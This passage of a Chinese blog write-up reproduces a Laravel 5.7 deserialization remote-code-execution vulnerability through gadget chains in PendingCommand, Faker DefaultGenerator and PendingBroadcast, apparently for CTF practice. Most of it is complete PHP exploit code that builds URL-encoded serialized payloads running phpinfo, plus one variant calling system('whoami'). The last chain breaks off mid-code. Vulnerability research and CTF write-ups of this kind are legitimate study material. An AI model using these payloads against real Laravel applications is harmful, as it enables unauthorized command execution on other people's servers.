+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;attributes[<span class="variable">$key</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话attributes参数是可控的，所以我们直接给attributes赋值一个键名为expectedOutput的数组，然后让test属性指向该对象，试图触发<code>__get()</code>方法</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121358570.png" alt="image-20250602121358570"></p>
+<p>成功触发<code>__get()</code>方法，并且for循环成功执行并退出createABufferedOutputMock方法</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121500847.png" alt="image-20250602121500847"></p>
+<p>返回到mockConsoleOutput()中发现还需要设置一个属性</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121713484.png" alt="image-20250602121713484"></p>
+<p>跟着做就行了</p>
+<p>但是还是卡住了</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602123437713.png" alt="image-20250602123437713"></p>
+<p>意思是我们没有一个对象在调用bind函数</p>
+<p>来到180行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">bind</span>(<span class="title class_">OutputStyle</span>::<span class="variable language_">class</span>, function () <span class="keyword">use</span> ($<span class="title">mock</span>) &#123;</span><br><span class="line">    <span class="title">return</span> $<span class="title">mock</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里需要调用bind函数，那我们跟进一下这个函数，在Illuminate\Container\Container类中</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602132328410.png" alt="image-20250602132328410"></p>
+<p>对app属性设置为这个类的实例化对象就行了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Container</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Container</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>=[];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Container</span>\<span class="title">Container</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; command = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; parameters[] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; app = <span class="keyword">new</span> <span class="title class_">Container</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以走通了，接下来，就是最关键的产生漏洞的代码点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exitCode</span> = <span class="variable language_">$this</span>-&gt;app[<span class="title class_">Kernel</span>::<span class="variable language_">class</span>]-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$this</span>-&gt;command, <span class="variable">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure>
+
+<p>这里的话通过实例化Illuminate\Contracts\Console\Kernel对象并调用call函数执行命令，猜测开发者的本意应该是实例化<code>Illuminate\Contracts\Console\Kernel</code>这个类，但是在<code>getConcrete</code>这个方法中出了问题，导致可以利用php的反射机制实例化任意类。而问题出在<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>的704行</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602145533130.png" alt="image-20250602145533130"></p>
+<p>可以看到这里判断<code>$this-&gt;bindings[$abstract])</code>是否存在，若存在则返回<code>$this-&gt;bindings[$abstract][&#39;concrete&#39;]</code>。$bindings是Container类的一个属性，如果我们能控制该属性的值，要寻找一个继承自<code>Container</code>的类，而<code>Illuminate\Foundation\Application</code>恰好继承自<code>Container</code>类，所以我们选择该对象传入<code>$this-&gt;app</code>的，由于我们已知<code>$abstract</code>变量为<code>Illuminate\Contracts\Console\Kernel</code>，所以我们只需通过反序列化定义<code>Illuminate\Foundation\Application</code>的<code>$bindings</code>属性存在键名为<code>Illuminate\Contracts\Console\Kernel</code>的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是<code>Illuminate\Foundation\Application</code>类，然后就可以执行call方法实现RCE</p>
+<h2 id="0x05exp编写"><a href="#0x05exp编写" class="headerlink" title="0x05exp编写"></a>0x05exp编写</h2><p>所以最终的exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span> =&gt; <span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>=[];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; command = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; parameters[] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; app = <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602145831041.png" alt="image-20250602145831041"></p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602150614975.png" alt="image-20250602150614975"></p>
+<p>成功执行RCE</p>
+<h2 id="0x06exp二开"><a href="#0x06exp二开" class="headerlink" title="0x06exp二开"></a>0x06exp二开</h2><p>在挖掘之前我讲一个自己发现的遗憾的地方</p>
+<p>这个是我刚刚在找<code>__get()方法</code>的时候就发现了一个很好玩的类\Faker\Generator类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进format后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这不是yii2框架的东西嘛，怎么还串门了，好神奇，跟进getFormatter发现也是一模一样，那看看是否可以用yii的链子，正则搜索一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602150745666.png" alt="image-20250602150745666"></p>
+<p>不过这个是抽象类，不能被实例化，找找他的继承类</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602151112375.png" alt="image-20250602151112375"></p>
+<p>那我们试着写一下链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingCommand::____destruct()-&gt;PendingCommand::run()-&gt;PendingCommand::mockConsoleOutput()-&gt;Generator::__get()-&gt;AuthorTest::stopOutputBuffering()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PharIo</span>\<span class="title class_">Manifest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">AuthorTest</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">outputCallback</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;outputCallback = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PharIo</span>\<span class="title class_">Manifest</span>\<span class="title class_">AuthorTest</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;expectedQuestions&#x27;</span>] =[<span class="keyword">new</span> <span class="title class_">AuthorTest</span>(),<span class="string">&#x27;stopOutputBuffering&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> \<span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; command = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; parameters[] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; test = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看了半天发现call_user_func所在的函数stopOutputBuffering是私有属性，只能类内部访问。那就打不通了</p>
+<p>好了回到正题，我们接着找找可利用的<code>__get()</code>方法</p>
+<p>找到一个类Faker\DefaultGenerator的get方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看看$default参数是否可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>__get</code>有返回值，可以做，那我们改一下我们之前的exp1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span> =&gt; <span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span> = <span class="title class_">array</span>(1,1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; command = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; parameters[] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; app = <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; test = <span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的一点，该漏洞只对laravel v5.7版本有效。因为5.7之前的版本并不存在入口类</p>
+<h2 id="0x07exp2"><a href="#0x07exp2" class="headerlink" title="0x07exp2"></a>0x07exp2</h2><p>做到web272的时候发现pendingCommand类被禁了，说明这里还有东西可以挖，我们继续挖一下</p>
+<p>先找找<code>__destruct()</code>入口</p>
+<p>找到一个类Illuminate\Broadcasting\PendingBroadcast，其实也不算找到吧，就是偶然发现了有这么一条链子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;events-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看看参数是否可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Dispatcher <span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>events参数和event参数都可控，那此时的思路有了，要么找到dispatch方法可利用的类，要么触发<code>__call()方法</code></p>
+<p>不过我更倾向于用<code>__call</code>方法，先用<code>__call()</code>来做突破点，跟进<code>src/Faker/Generator.php</code>中的<code>__call()</code>方法，发现其调用了<code>format()</code>方法，进而调用<code>getFormatter()</code>方法</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602155617880.png" alt="image-20250602155617880"></p>
+<p>由于<code>getFormatter()</code>方法中的<code>$this-&gt;formatters[$formatter]</code>是可控的并直接 return 回上一层，因此可以利用该可控参数来进行命令执行 RCE 操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title 